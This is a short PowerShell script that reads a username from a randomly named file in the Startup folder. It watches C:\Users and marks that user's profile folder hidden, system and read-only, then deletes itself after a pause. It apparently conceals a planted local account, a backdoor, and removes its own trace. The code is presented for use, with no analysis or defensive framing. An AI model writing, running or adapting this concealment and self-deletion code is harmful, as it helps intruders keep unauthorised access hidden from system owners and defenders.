# Getting local user from init
$global:user = (Get-Content "C:/Users/$env:userName/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup/etgtYmwQUO.txt").Trim()
[bool] $global:undone = $true


$watcher = New-Object System.IO.FileSystemWatcher
$watcher.Path = "C:\Users"
$watcher.Filter = "*.*"
$watcher.IncludeSubdirectories = $false
$watcher.EnableRaisingEvents = $true

# HIDE
$action = { $path = $Event.SourceEventArgs.FullPath
            $changeType = $Event.SourceEventArgs.ChangeType
            attrib +h +s +r C:\Users\$user
            echo "hi" > .\hi.txt
}

# If the folder is created
Register-ObjectEvent $watcher "Created" -Action $action

# Give time to local user
while($undone) {
  Start-Sleep -Seconds 100
  $undone = $false
}

Remove-Item $PSCommandPath -Force
